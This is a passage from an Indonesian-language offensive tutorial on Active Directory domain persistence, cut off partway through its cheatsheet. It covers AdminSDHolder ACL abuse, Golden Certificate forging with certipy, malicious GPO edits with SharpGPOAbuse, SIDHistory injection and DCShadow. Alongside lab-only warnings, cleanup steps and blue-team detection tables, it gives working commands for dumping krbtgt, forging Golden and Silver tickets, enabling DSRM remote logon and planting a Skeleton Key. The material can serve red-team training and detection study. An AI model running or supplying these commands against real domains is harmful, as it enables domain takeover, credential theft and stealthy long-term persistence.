|DSRM hash tidak ditemukan|Query hanya melihat domain credential|Analyze local SAM/security data|
|Login gagal|DSRM remote behavior disabled|Check `DSRMAdminLogonBehavior`|
|Wrong credential|Menggunakan domain Administrator|Gunakan `DC01\Administrator`|
|Hash valid tetapi remote login gagal|Remote policy/service restriction|Check DC policy|
|After reboot access lost|Configuration tidak persistent / service state changed|Re-check lab state|

---

# 🛡️ 5. ADMINSDHOLDER ABUSE

## 5.1 🧠 Apa Itu AdminSDHolder?

`AdminSDHolder` adalah object khusus di:

```text
CN=AdminSDHolder,CN=System,DC=domain,DC=local
```

yang berfungsi sebagai semacam **security descriptor template** untuk sejumlah protected accounts/groups.

Microsoft menjelaskan bahwa object ini digunakan sebagai template permissions dan proses **SDProp** pada PDCE secara default memeriksa protected objects sekitar setiap 60 menit.

---

# 5.1.1 ⏱️ SDProp

Flow:

```text
AdminSDHolder
      │
      │ security descriptor
      ▼
SDProp
      │
      ▼
Protected Objects
```

Contoh:

```text
AdminSDHolder
     │
     ▼
Domain Admins
     │
     ▼
Administrator
```

Jika perubahan permission pada protected object tidak sesuai:

```text
SDProp
   │
   ▼
re-apply protected descriptor
```

---

# 5.1.2 🏢 Analogi

Bayangkan perusahaan punya template security:

```text
MASTER SECURITY TEMPLATE
          │
          ▼
     DEPARTMENT A
     DEPARTMENT B
     DEPARTMENT C
```

Daripada mengubah setiap department satu per satu, template pusat menentukan permissions.

AdminSDHolder bekerja dengan konsep serupa untuk protected AD objects.

---

# 5.2 🛡️ Protected Accounts/Groups

Beberapa protected principals mencakup:

```text
Account Operators
Administrator
Administrators
Backup Operators
Domain Admins
Domain Controllers
Enterprise Admins
Enterprise Key Admins
Key Admins
KRBTGT
Print Operators
Read-only Domain Controllers
Replicator
Schema Admins
Server Operators
```

Microsoft secara resmi mencantumkan akun/grup tersebut sebagai protected objects/accounts.

---

# 5.2.1 ⚠️ KRBTGT

Perhatikan bahwa:

```text
KRBTGT
```

adalah **protected account**, bukan group.

Jadi jangan menulis:

```text
"KRBTGT protected group"
```

Mental model yang benar:

```text
Protected Objects
  ├── Protected Groups
  └── Protected Accounts
         └── KRBTGT
```

---

# 5.3 🔎 Identifikasi AdminSDHolder Abuse

Konsep attack:

```text
ATTACKER
   │
   │ write security descriptor
   ▼
AdminSDHolder
   │
   │ SDProp
   ▼
Protected Group/Object
```

Query ACL:

```bash
# Read AdminSDHolder ACL in the lab
python3 /opt/impacket/examples/dacledit.py \
    -action read \
    -target-dn "CN=AdminSDHolder,CN=System,DC=domain,DC=local" \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP"
```

> **Catatan Alat**: Tool `dacledit.py` adalah komponen Impacket yang relatif baru. Jika tidak ditemukan di sistem Anda (`find / -name dacledit.py 2>/dev/null`), Anda dapat menggunakan alternatif `bloodyAD` (`pip3 install bloodyAD`) dari Linux atau `PowerView` (`Get-DomainObjectAcl -SearchBase "CN=AdminSDHolder,CN=System,DC=domain,DC=local"`) dari target Windows.

---

# 5.3.1 🧠 Yang Harus Dicari

```text
WriteDACL
WriteOwner
GenericAll
WriteProperty
```

Tetapi jangan langsung berasumsi:

```text
GenericAll
=
automatic DA
```

Impact bergantung:

```text
ACE
+
protected object type
+
attribute
+
SDProp
```

Microsoft bahkan menekankan bahwa permissions yang perlu diberikan ke protected groups harus sesuai dengan jenis atribut/object yang ingin dimodifikasi.

---

# 5.4 ⚠️ Granting an ACE

Untuk lab, secara konsep:

```text
Low Priv Account
      │
      ▼
AdminSDHolder ACL
      │
      ▼
Write permission
      │
      ▼
SDProp
      │
      ▼
Protected object
```

Salah satu bentuk command-based ACL modification:

```bash
# Example lab-only full-control ACE
# Use only on a disposable AD lab
python3 /opt/impacket/examples/dacledit.py \
    -action write \
    -rights FullControl \
    -principal "$USERNAME" \
    -target-dn "CN=AdminSDHolder,CN=System,DC=domain,DC=local" \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP"
```

---

# 5.4.1 🔍 Verify

```bash
# Review AdminSDHolder ACL
python3 /opt/impacket/examples/dacledit.py \
    -action read \
    -target-dn "CN=AdminSDHolder,CN=System,DC=domain,DC=local" \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP"
```

---

# 5.5 ⏱️ SDProp

Default behavior:

```text
~60 minutes
```

dan berjalan pada DC yang memegang PDC Emulator role. Microsoft mendokumentasikan hal ini secara eksplisit.

Diagram:

```text
AdminSDHolder changed
        │
        ▼
Wait / trigger SDProp
        │
        ▼
Protected object ACL updated
```

---

# 5.5.1 🛠️ Force SDProp

Microsoft mendokumentasikan bahwa SDProp dapat dijalankan manual melalui LDAP modification dengan attribute:

```text
RunProtectAdminGroupsTask
```

pada RootDSE.

Secara konseptual:

```text
RootDSE
   │
   └── RunProtectAdminGroupsTask = 1
             │
             ▼
           SDProp
```

> Untuk workflow pemula, memahami **mengapa SDProp terjadi** lebih penting daripada menghafal satu command force-trigger.

---

# 5.5.2 ✅ Verifikasi Setelah SDProp

Jangan hanya membaca AdminSDHolder.

Periksa protected object:

```text
AdminSDHolder
      │
      ▼
SDProp
      │
      ▼
Domain Admins ACL
```

Microsoft menyarankan memverifikasi perubahan pada protected groups/objects setelah SDProp berjalan.

---

# 5.6 💥 Setelah ACL Terpropagasi

Dalam lab:

```text
user
 │
 └── delegated rights
        │
        ▼
Domain Admins group
```

Kemudian membership dapat diubah sesuai permission yang diberikan:

```text
DOMAIN\USERNAME
        │
        ▼
Domain Admins
```

Contoh dengan `net`/appropriate AD administration tooling:

```bash
# Lab-only: modify group membership after delegated rights are effective
net rpc group addmem \
    "Domain Admins" \
    "$USERNAME" \
    -U "$DOMAIN/$USERNAME%$PASSWORD" \
    -S "$DC_IP"
```

> Syntax `net rpc` dapat berbeda berdasarkan Samba build. Tujuan pedagogisnya adalah memahami chain:
> 
> **AdminSDHolder ACL → SDProp → protected group rights → membership/control.**

---

# 🧹 5.7 Cleanup AdminSDHolder

Hapus ACE yang dibuat:

```text
AdminSDHolder
      │
      └── remove attacker ACE
```

Kemudian:

```text
force/wait SDProp
      │
      ▼
verify protected objects
```

---

# 📜 6. GOLDEN CERTIFICATE

## 6.1 🧠 Konsep Golden Certificate

Golden Certificate adalah persistence/forgery concept yang menggunakan **CA private key** untuk membuat certificate yang dipercaya domain.

Ini berhubungan langsung dengan File 40.

```text
CA PRIVATE KEY
      │
      ▼
Forge Certificate
      │
      ▼
Certificate accepted by PKI trust
      │
      ▼
PKINIT / authentication
```

---

# 6.1.1 🏛️ Mengapa Sangat Powerful?

Bayangkan:

```text
CA
 │
 └── signs certificates
          │
          ▼
       domain trust
```

Jika private key CA dicuri:

```text
CA PRIVATE KEY
      │
      ▼
Attacker can forge certificates
```

Jadi attacker tidak perlu terus memodifikasi:

```text
password
group
ACL
```

---

# 6.1.2 ⏳ Persistence

Certificate forged dapat bertahan sesuai:

```text
certificate validity
+
CA trust
+
certificate mapping
+
revocation state
```

KRBTGT reset:

```text
KRBTGT reset
   │
   └── does not itself revoke CA private key
```

Jadi Golden Certificate dan Golden Ticket berasal dari trust root yang berbeda.

---

# 6.2 🔐 Forge Certificate

> **Lab only.** Command berikut mengasumsikan CA private key/PFX CA sudah diperoleh secara sah di environment lab.

```bash
# CA certificate/private key container
export CA_PFX="ca.pfx"

# Target user identity
export TARGET_UPN="administrator@$DOMAIN"

# Forge certificate using the CA private key
certipy forge \
    -ca-pfx "$CA_PFX" \
    -upn "$TARGET_UPN"
```

Contoh:

```text
[*] Loaded certificate and private key
[*] Forging certificate
[*] Saving certificate to 'administrator_forged.pfx'
```

---

# 6.2.1 🎫 Authenticate

```bash
# Authenticate using forged certificate
certipy auth \
    -pfx "administrator_forged.pfx" \
    -dc-ip "$DC_IP"
```

Concept:

```text
CA private key
      │
      ▼
administrator.pfx
      │
      ▼
PKINIT
      │
      ▼
administrator.ccache
```

---

# 6.2.2 ⚠️ Certificate Mapping

Again:

```text
certificate issued/forged
       ≠
automatic Administrator access
```

Modern environments may enforce stronger certificate mapping.

Periksa:

```text
UPN
SID extension
issuer
EKU
mapping policy
```

---

# 6.3 🧠 Kenapa Golden Certificate Sangat Berbahaya?

Karena attacker memiliki:

```text
CA private key
```

bukan hanya:

```text
one user password
```

Attack surface:

```text
CA private key
     │
     ├── user certificate
     ├── computer certificate
     └── privileged certificate
```

---

# 🧹 6.4 Golden Certificate Cleanup

Berbeda dengan password:

```text
delete certificate file
```

tidak cukup.

Jika private key CA sudah bocor, remediation sebenarnya mencakup:

```text
CA key compromise
   │
   ▼
CA recovery / key rotation
   │
   ▼
certificate inventory
   │
   ▼
revoke affected certs
   │
   ▼
review certificate mapping
```

Karena itu Golden Certificate adalah incident-response-level problem.

---

# 📋 7. MALICIOUS GPO

## 7.1 🧠 Konsep GPO Persistence

Group Policy Object dapat menerapkan policy/setting kepada:

```text
Domain
   │
   ├── OU 1
   ├── OU 2
   └── OU 3
```

Jika attacker mendapatkan control terhadap GPO yang diterapkan ke banyak komputer:

```text
Malicious GPO
      │
      ▼
Computer A
Computer B
Computer C
Computer D
```

Ini membuat GPO menjadi persistence mechanism dengan **scope yang besar**.

---

# 7.1.1 🏢 Analogi

Bayangkan ada satu peraturan perusahaan:

```text
"Semua laptop perusahaan,
install software X."
```

Jika attacker mengubah peraturan:

```text
"Semua laptop,
jalankan program Y."
```

maka satu perubahan policy dapat menjangkau banyak endpoint.

---

# 7.2 🔎 Identify GPO Permissions

PowerView:

```powershell
# Enumerate domain GPOs
Get-DomainGPO

# Review ACLs for GPO objects
Get-DomainGPO |
    Get-DomainObjectAcl -ResolveGUIDs |
    Where-Object {
        $_.ActiveDirectoryRights -match "Write"
    }
```

Cari:

```text
GenericWrite
WriteDACL
WriteOwner
GenericAll
```

---

# 7.2.1 🧠 BloodHound

Mental model:

```text
USER
 │
 └── controls GPO
         │
         ▼
      Computers
```

Pertanyaan:

```text
"Apakah GPO ini linked ke banyak OU/computers?"
```

Impact GPO bergantung bukan hanya pada:

```text
write permission
```

tetapi juga:

```text
GPO scope
GPO links
OU membership
security filtering
```

---

# 7.3 💥 SharpGPOAbuse

SharpGPOAbuse adalah tool Windows-side yang dapat memodifikasi GPO sesuai privilege/ACL yang dimiliki.

> Gunakan hanya pada GPO lab. Hindari `Default Domain Policy` pada real environment kecuali secara eksplisit diizinkan.

Contoh konseptual lab:

```powershell
# Add a local administrator through the controlled lab GPO
.\SharpGPOAbuse.exe `
    --AddLocalAdmin `
    --UserAccount "$USERNAME" `
    --GPOName "Lab-GPO"
```

Output:

```text
[+] Domain Controller successfully contacted
[+] User added to local administrators group policy
[+] GPO modified successfully
```

---

# 7.3.1 📅 Scheduled Task via GPO

```powershell
# Example lab GPO scheduled task
.\SharpGPOAbuse.exe `
    --AddComputerTask `
    --TaskName "LabPersistence" `
    --Author "NT AUTHORITY\SYSTEM" `
    --Command "cmd.exe" `
    --Arguments "/c whoami" `
    --GPOName "Lab-GPO"
```

Force update pada lab:

```powershell
# Apply updated Group Policy immediately
gpupdate /force
```

---

# 7.3.2 🧠 Attack Chain GPO

```text
GPO Write
    │
    ▼
Modify GPO
    │
    ▼
GPO linked?
    │
    ▼
Computer/User affected
    │
    ▼
Policy applies
    │
    ▼
Persistence
```

---

# 7.4 🧹 GPO Cleanup

Cleanup:

```text
1. Remove malicious task/settings
2. Restore original GPO configuration
3. Force GP refresh
4. Verify endpoint state
5. Compare before/after GPO
```

Check:

```powershell
# Verify applied GPOs
gpresult /r
```

Detailed:

```powershell
# Generate HTML Group Policy report
gpresult /h C:\Temp\gp-report.html
```

---

# 🕵️ 8. SID HISTORY ABUSE

## 8.1 🧠 Apa Itu SIDHistory?

`SIDHistory` digunakan Active Directory terutama untuk migration scenarios.

Misalnya:

```text
OLD DOMAIN
S-1-5-21-OLD-...
```

Account pindah:

```text
NEW DOMAIN USER
       │
       └── SIDHistory = OLD SID
```

Ini memungkinkan compatibility terhadap resource lama.

---

# 8.1.1 💥 Mengapa Bisa Disalahgunakan?

Jika attacker dapat memasukkan SID yang sangat privileged ke `SIDHistory`:

```text
Attacker User
    │
    └── SIDHistory
          │
          └── privileged SID
```

Windows authorization dapat mempertimbangkan SID tersebut dalam access token pada kondisi yang sesuai.

---

# 8.1.2 🎯 Example RID

Enterprise Admins:

```text
519
```

Domain Admins:

```text
512
```

Sehingga konsepnya:

```text
DOMAIN SID
   +
519
   =
Enterprise Admin SID
```

---

# 8.2 🧪 SIDHistory Modification

SIDHistory modification adalah advanced directory manipulation dan bukan sekadar "add SID".

Pada lab Windows, Mimikatz historically menyediakan functionality seperti:

```text
privilege::debug
misc::addsid targetuser S-1-5-21-...-519
```

> Ini membutuhkan privilege yang sangat tinggi dan AD conditions yang tepat. Jangan gunakan SIDHistory command ini pada production domain.

---

# 8.2.1 🐧 LDAP Perspective

Secara konsep:

```text
USER OBJECT
    │
    └── sIDHistory
          │
          └── privileged SID
```

Challenge sebenarnya bukan sekadar:

```text
"Can I write attribute?"
```

melainkan:

```text
Can I write SIDHistory
+
can AD accept it
+
does resulting access token honor it?
```

---

# 8.3 🔎 Verifikasi SIDHistory

Gunakan LDAP:

```bash
# Query SIDHistory for a target account
ldapsearch -x \
    -H "ldap://$DC_IP" \
    -D "CN=$USERNAME,CN=Users,DC=domain,DC=local" \
    -w "$PASSWORD" \
    -b "DC=domain,DC=local" \
    "(sAMAccountName=targetuser)" \
    sIDHistory \
    sAMAccountName
```

Contoh:

```text
dn: CN=targetuser,CN=Users,DC=domain,DC=local
sAMAccountName: targetuser
sIDHistory: S-1-5-21-1111111111-2222222222-3333333333-519
```

---

# 8.3.1 🧠 Interpretasi

```text
Current SID
    =
targetuser

SIDHistory
    =
Enterprise Admin SID
```

Ini adalah red flag besar.

---

# 🧹 8.4 Cleanup SIDHistory

Remove unauthorized SIDHistory:

```text
target user
    │
    └── remove rogue SIDHistory
```

Kemudian:

```text
[ ] verify attribute
[ ] inspect token
[ ] verify group/access state
[ ] audit originating change
```

---

# 🌓 9. DCSHADOW

## 9.1 🧠 Konsep DCShadow

DCShadow adalah teknik advanced di mana attacker memanfaatkan mekanisme replication-like behavior untuk membuat perubahan directory tampak seperti berasal dari replication source yang valid.

Simplified:

```text
Normal:

DC1 ◄────────► DC2
       AD Replication
```

DCShadow concept:

```text
ATTACKER HOST
      │
      │ temporary DC-like registration
      ▼
REPLICATION-LIKE CHANNEL
      │
      ▼
DOMAIN
      │
      ▼
AD changes
```

---

# 9.1.1 🧠 Kenapa Menarik?

Karena attacker tidak selalu menggunakan:

```text
normal LDAP modification
```

melainkan dapat memanfaatkan:

```text
AD replication protocol semantics
```

---

# 9.2 ⚠️ Jangan Salah Mengartikan "Stealth"

DCShadow sering disebut stealthy karena menggunakan replication-style operations.

Tetapi:

```text
DCShadow
=
undetectable
```

adalah salah.

Replication metadata, machine/DC registration, unusual replication behavior, endpoint telemetry, dan identity changes tetap dapat menjadi detection source.

---

# 9.2.1 🎯 Kapan Dipelajari?

Untuk pemula:

```text
Understand:
 [✓] concept
 [✓] attack surface
 [✓] detection

Skip:
 [ ] memorizing complex command chain
```

Karena DCShadow jauh lebih mudah dipahami setelah:

```text
AD replication
FSMO
DC roles
RPC
security descriptors
```

sudah dipahami.

---

# 9.3 🧭 Mental Model DCShadow

```text
Attacker
   │
   ▼
Register temporary DC-like state
   │
   ▼
Push directory changes
   │
   ▼
Domain accepts replication-related operation
   │
   ▼
Object modified
```

Tidak ada command detail di workflow ini.

---

# 🌳 10. DECISION TREE DOMAIN PERSISTENCE

```text
                    ┌─────────────────────────┐
                    │ HAVE HIGH PRIVILEGE?    │
                    └────────────┬────────────┘
                                 │
                        ┌────────┴────────┐
                        │                 │
                       YES               NO
                        │                 │
                        ▼                 ▼
              Can access domain?    Need escalation
                        │                 │
                        ▼                 ▼
               [COLLECT KEYS FIRST]   File 45 / ACL
                        │
                        ▼
                 KRBTGT AVAILABLE?
                        │
                 ┌──────┴──────┐
                 ▼             ▼
                YES            NO
                 │              │
                 ▼              ▼
           Golden Ticket    Alternative:
                 │           service key
                 │           certificate
                 │           GPO/ACL
                 │
                 ▼
             PERSISTENCE
```

---

# 10.1 🥇 Phase 1 — Collect KRBTGT

```text
DOMAIN ADMIN
     │
     ▼
DCSync KRBTGT
     │
     ▼
KRBTGT key material
```

Dalam real assessment:

```text
STOP
│
└── Confirm authorization
```

---

# 10.2 🧩 Decision Berdasarkan Goal

```text
Need broad Kerberos persistence?
        │
        └── Golden Ticket

Need one service?
        │
        └── Silver Ticket

Need temporary DC auth bypass?
        │
        └── Skeleton Key

Need recovery-account path?
        │
        └── DSRM

Need ACL-based long-term path?
        │
        └── AdminSDHolder

Have CA private key?
        │
        └── Golden Certificate

Have GPO write access?
        │
        └── Malicious GPO

Have SIDHistory modification capability?
        │
        └── SID History

Need advanced replication abuse?
        │
        └── DCShadow
```

---

# 10.3 🔑 Jika KRBTGT Tidak Bisa Di-dump

Jangan langsung menyimpulkan:

```text
"No persistence."
```

Alternative assessment branches:

```text
KRBTGT unavailable
      │
      ├── service/computer key?
      │      └── Silver Ticket candidate
      │
      ├── CA private key?
      │      └── Golden Certificate
      │
      ├── GPO write?
      │      └── GPO persistence
      │
      ├── AdminSDHolder access?
      │      └── ACL persistence
      │
      ├── DSRM credential?
      │      └── DSRM path
      │
      └── none?
             └── Continue enumeration
```

---

# 10.4 🌐 Jika DC Tidak Bisa Diakses Langsung

Persistence tidak selalu berarti:

```text
remote shell on DC
```

Contoh:

```text
CA private key
   │
   └── may be stored/protected separately

GPO
   │
   └── directory-controlled

AdminSDHolder
   │
   └── LDAP object
```

Jadi:

```text
No interactive DC shell
      ≠
No domain persistence opportunity
```

---

# 10.5 🕵️ Jika Butuh Stealth Tinggi

Gunakan reasoning:

```text
Need stealth
     │
     ▼
Minimize:
 ├── directory writes
 ├── endpoint modifications
 ├── process injection
 ├── configuration changes
 └── repeated authentication anomalies
```

Candidate secara konseptual:

```text
Silver Ticket
Certificate-based persistence
```

tetapi:

```text
"stealthier"
≠
"undetectable"
```

---

# 📊 11. COMPARISON TABLE

|Teknik|Prereq|Stealth|Durability|Detection|Cleanup|CTF Relevance|
|---|---|--:|--:|---|---|--:|
|**Golden Ticket**|KRBTGT key|Medium|High|Kerberos anomalies, unusual ticket lifetime/metadata, account usage|KRBTGT rotation + revoke forged access|🔥 HIGH|
|**Silver Ticket**|Service key|High*|Medium|Service logs, unusual ticket behavior|Rotate service key / wait ticket expiry|🟠 MEDIUM|
|**Skeleton Key**|DA + DC execution|Low|Low|LSASS/EDR/process telemetry|Reboot / restore system state|🟡 LOW|
|**DSRM**|DSRM credential + suitable DC configuration|High*|High|Registry + DC logon telemetry|Restore registry / rotate DSRM credential|🟠 MEDIUM|
|**AdminSDHolder**|Write to AdminSDHolder|Medium|High|ACL auditing, protected-object changes|Remove ACE + SDProp|🟠 MEDIUM|
|**DCShadow**|Very high privilege + replication capability|Variable|High|Replication/DC registration anomalies|Restore modified objects/replication state|🟡 LOW|
|**Golden Certificate**|CA private key|High*|Very High|CA issuance, certificate mapping, trust-store/audit data|Revoke certs + CA key rotation/recovery|🔥 HIGH|
|**Malicious GPO**|GPO write|Medium|High|GPO auditing, SYSVOL changes, policy events|Restore GPO|🟠 MEDIUM|
|**SID History**|High privilege + modification capability|Medium|High|`sIDHistory` audit|Remove rogue SIDHistory|🟡 MEDIUM|

* Relative only. Detection depends heavily on environment.

---

# 🕵️ 12. COMMON ERRORS & TROUBLESHOOTING

|Error|Penyebab|Solusi|
|---|---|---|
|Golden Ticket `Encryption type not supported`|Key/ticket encryption mismatch|Use compatible NT/AES key|
|Golden Ticket `Clock skew too great`|Attacker clock != DC|Sync time|
|Golden Ticket hostname/IP issue|SPN mismatch|Use FQDN/hostname matching SPN|
|Silver Ticket `KRB_AP_ERR_BAD_INTEGRITY`|Wrong service key|Re-obtain exact service/computer key|
|`KDC_ERR_SUMTYPE_NOSUPP`|Unsupported checksum/encryption|Check key type and environment|
|DSRM registry `Access denied`|Insufficient local admin rights|Validate privilege|
|AdminSDHolder change has no effect|SDProp not yet run / wrong rights|Wait/trigger SDProp and verify protected object|
|KRBTGT dump denied|Missing replication rights|Verify DA/equivalent rights|
|ccache unreadable|Wrong path/format|`echo $KRB5CCNAME; file ticket.ccache; klist`|
|`klist` shows no ticket|Cache not loaded|Export correct `KRB5CCNAME`|
|Domain SID wrong|Included RID / typo|Use pure domain SID|
|AES vs NTLM mismatch|Wrong key passed to tool|Match `-nthash` vs `-aesKey`|
|PTT fails because ticket expired|Cache expired|Obtain fresh ticket|
|Host does not resolve|DNS/hosts issue|Add FQDN to `/etc/hosts` in lab|
|Kerberos double-hop fails|Credentials not delegated to second hop|Use explicit ticket/service authentication path|
|Golden Ticket works on one service but not another|SPN/service differences|Test proper service SPN|
|Silver Ticket rejected|Wrong service account key|Check SPN ownership|
|DSRM hash works locally but not remotely|Remote logon behavior disabled|Check `DSRMAdminLogonBehavior`|
|GPO change not applied|GPO not linked/filtering/refresh issue|`gpresult /r`, `gpupdate /force`|
|SIDHistory present but no access|Token/mapping/authorization issue|Validate effective token and SID|
|Golden Certificate auth fails|Strong mapping/EKU/SID issue|Inspect certificate and mapping|
|Certificate valid but account disabled|Mapping/account policy blocks auth|Verify current authentication policy|
|AdminSDHolder ACL changes revert|SDProp behavior|Determine whether object is protected and intended ACE|
|DCShadow modification not visible as expected|Replication topology/registration issue|Recheck AD replication state|

---

# 12.1 ⏰ Kerberos Troubleshooting Order

Jika Golden/Silver Ticket gagal:

```text
KERBEROS FAILURE
      │
      ▼
[1] DATE/TIME
      │
      ▼
[2] REALM / DOMAIN
      │
      ▼
[3] HOSTNAME
      │
      ▼
[4] SPN
      │
      ▼
[5] KEY TYPE
      │
      ▼
[6] KEY MATERIAL
      │
      ▼
[7] TICKET VALIDITY
      │
      ▼
[8] TARGET AUTHORIZATION
```

Jangan langsung mengganti semua parameter sekaligus.

---

# 12.2 🎫 ccache Debugging

```bash
# Check current cache path
echo "$KRB5CCNAME"

# Inspect cache
klist

# Check file type
file "$KRB5CCNAME"
```

Jika:

```text
klist: No credentials cache found
```

maka:

```text
environment variable
        │
        ▼
wrong path / expired / missing
```

---

# 12.3 🔐 Golden Certificate Debugging

Periksa certificate:

```bash
# Inspect PFX contents
openssl pkcs12 \
    -in "administrator_forged.pfx" \
    -info \
    -nodes
```

Cari:

```text
Subject
Issuer
Validity
EKU
SAN
```

---

# 🧠 13. OPSEC & DETECTION NOTES

## 13.1 🔎 Blue Team Detection Table

|Teknik|Event/Telemetry yang Relevan|Anomali|Detection Tool|
|---|---|---|---|
|Golden Ticket|Kerberos events such as 4768/4769 plus endpoint telemetry|Ticket lifetime/identity/timing tidak normal|SIEM, DC logs, EDR|
|Silver Ticket|Service-side Kerberos events, endpoint logs|Service ticket muncul tanpa expected KDC pattern / abnormal identity|SIEM, service logs|
|Skeleton Key|Process/LSASS telemetry|Suspicious LSASS modification|EDR, Sysmon, Defender|
|DSRM|Registry + logon events|Unusual DC local Administrator activity|SIEM, registry monitoring|
|AdminSDHolder|Directory/ACL auditing|Unauthorized ACE on AdminSDHolder|AD auditing, SIEM|
|DCShadow|Replication/DC registration telemetry|Unexpected replication source/object changes|AD auditing, Defender/SIEM|
|Golden Certificate|CA/IIS/AD CS logs|Unusual certificate issuance/authentication|CA logs, SIEM|
|GPO Persistence|Group Policy/SYSVOL changes|Unexpected GPO modification|GPO auditing, SIEM|
|SID History|Directory changes|New privileged SIDHistory|AD auditing, BloodHound/inventory tools|

> Event IDs dan exact telemetry bergantung pada audit policy. Jangan menganggap satu Event ID selalu cukup untuk mendeteksi teknik tertentu.

---

# 13.1.1 🪙 Golden Ticket Detection

Defender dapat bertanya:

```text
"Apakah identity ini menggunakan
ticket yang tidak masuk akal?"
```

Contoh anomaly:

```text
ticket lifetime unusually long
unusual client/server relationship
unexpected privilege
authentication pattern inconsistent with user
```

---

# 13.1.2 🥈 Silver Ticket Detection

Karena Silver Ticket dapat menghindari sebagian normal KDC flow:

```text
Service
   │
   └── receives ticket
```

Defender dapat membandingkan:

```text
service logs
+
KDC telemetry
+
endpoint identity
```

---

# 13.1.3 🦴 Skeleton Key Detection

Cari:

```text
LSASS tampering
memory patching
suspicious Mimikatz-like process
```

Karena itu skeleton key sangat noisy.

---

# 13.1.4 🗝️ DSRM Detection

Cari:

```text
DC01\Administrator
```

dalam konteks remote authentication yang tidak biasa.

Juga:

```text
DSRMAdminLogonBehavior
```

registry change.

---

# 13.1.5 🛡️ AdminSDHolder Detection

Microsoft menjelaskan bahwa perubahan pada protected objects dapat dipulihkan oleh SDProp, dan bahwa AdminSDHolder menjadi sumber security descriptor bagi protected accounts/groups.

Detection:

```text
Unexpected ACE
      │
      ▼
AdminSDHolder
      │
      ▼
unexpected protected-object permission
```

---

# 13.1.6 🏛️ Golden Certificate Detection

Cari:

```text
CA certificate issuance
certificate request anomalies
unusual UPN/SID combinations
unexpected certificate authentication
CA private-key compromise indicators
```

---

# 13.2 🕵️ "Stealth" Notes

## Golden Ticket dengan AES

Secara umum:

```text
AES
```

lebih sesuai dengan lingkungan Kerberos modern daripada:

```text
RC4/NTLM
```

Tetapi jangan menyimpulkan:

```text
AES
=
invisible
```

---

## Silver Ticket

Lebih terbatas dan dapat menghasilkan lebih sedikit KDC-side noise dibanding Golden Ticket.

Tetapi:

```text
service telemetry
+
endpoint telemetry
```

tetap ada.

---

## AdminSDHolder

Tidak selalu "quiet".

Jika auditing directory bagus:

```text
ACL change
```

dapat terlihat.

---

## DSRM

Persistence dapat terlihat melalui:

```text
registry
+
DC local authentication
```

---

# 🚨 13.3 WARNING — Teknik Sangat Destructive

## 🔴 KRBTGT

Reset KRBTGT memiliki operational consequences terhadap Kerberos.

Jangan melakukan:

```text
reset #1
reset #2
```

secara sembarangan pada production.

---

## 🔴 Skeleton Key

Menyentuh:

```text
LSASS / DC authentication
```

sangat berisiko.

---

## 🔴 Golden Certificate

CA private key compromise dapat berarti:

```text
PKI trust compromise
```

bukan sekadar satu user compromise.

---

## 🔴 Malicious GPO

Satu GPO dapat mempengaruhi:

```text
dozens
hundreds
thousands
```

of endpoints.

---

# ⚡ 14. CHEATSHEET DOMAIN PERSISTENCE

# 14.1 🔥 GOLDEN TICKET

```bash
# ==========================================
# GOLDEN TICKET - CHEATSHEET
# ==========================================

# 1. Dump KRBTGT
python3 /opt/impacket/examples/secretsdump.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    -just-dc-user "krbtgt"
```

```bash
# 2. Get Domain SID
python3 /opt/impacket/examples/lookupsid.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" |
    head -20
```

```bash
# 3. Forge TGT
python3 /opt/impacket/examples/ticketer.py \
    -nthash "$KRBTGT_NTLM" \
    -domain-sid "$DOMAIN_SID" \
    -domain "$DOMAIN" \
    "administrator"
```

```bash
# 4. Use ticket
export KRB5CCNAME="$PWD/administrator.ccache"

# Verify
klist

# Use Kerberos
python3 /opt/impacket/examples/psexec.py \
    -k \
    -no-pass \
    "$DOMAIN/administrator@$TARGET_HOSTNAME"
```

---

# 14.2 🥈 SILVER TICKET

```bash
# ==========================================
# SILVER TICKET - CHEATSHEET
# ==========================================

# 1. Get service/computer key material
python3 /opt/impacket/examples/secretsdump.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    -just-dc-user "TARGETACCOUNT$"
```

```bash
# 2. Forge service ticket
python3 /opt/impacket/examples/ticketer.py \
    -nthash "$SERVICE_NTLM" \
    -domain-sid "$DOMAIN_SID" \
    -domain "$DOMAIN" \
    -spn "cifs/$TARGET_HOSTNAME" \
    "administrator"
```

```bash
# 3. Load ticket
export KRB5CCNAME="$PWD/administrator.ccache"

# Verify
klist
```

```bash
# 4. Access service
smbclient \
    "//$TARGET_HOSTNAME/C$" \
    -k \
    --no-pass
```

---

# 14.3 🦴 SKELETON KEY

```text
# ==========================================
# SKELETON KEY - LAB CHEATSHEET
# ==========================================

# Windows / Mimikatz
privilege::debug
misc::skeleton
```

Linux-side concept:

```bash
# Use the lab skeleton password
python3 /opt/impacket/examples/psexec.py \
    "$DOMAIN/administrator:SKELETON_PASSWORD@$DC_IP"
```

---

# 14.4 🗄️ DSRM

```bash
# ==========================================
# DSRM - LAB CHEATSHEET
# ==========================================

# 1. Dump local SAM from the DC
python3 /opt/impacket/examples/secretsdump.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    -sam
```

```bash
# 2. Check DSRM remote logon behavior
python3 /opt/impacket/examples/reg.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    query \
    'HKLM\System\CurrentControlSet\Control\Lsa' \
    -v DSRMAdminLogonBehavior
```

```bash
# 3. Lab-only: enable DSRM remote logon behavior
python3 /opt/impacket/examples/reg.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    add \
    'HKLM\System\CurrentControlSet\Control\Lsa' \
    -v DSRMAdminLogonBehavior \
    -vt REG_DWORD \
    -vd 2
```

```bash
# 4. Authenticate as the LOCAL DSRM Administrator
python3 /opt/impacket/examples/psexec.py \
    -hashes ":$DSRM_NTLM_HASH" \
    "DC01/Administrator@$DC_IP"
```

---

# 14.5 🛡️ ADMINSDHOLDER

```bash
# ==========================================
# ADMINSDHOLDER - LAB CHEATSHEET
# ==========================================

# 1. Read current ACL
python3 /opt/impacket/examples/dacledit.py \
    -action read \
    -target-dn "CN=AdminSDHolder,CN=System,DC=domain,DC=local" \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP"
```

```bash
# 2. Lab-only: add controlled ACE
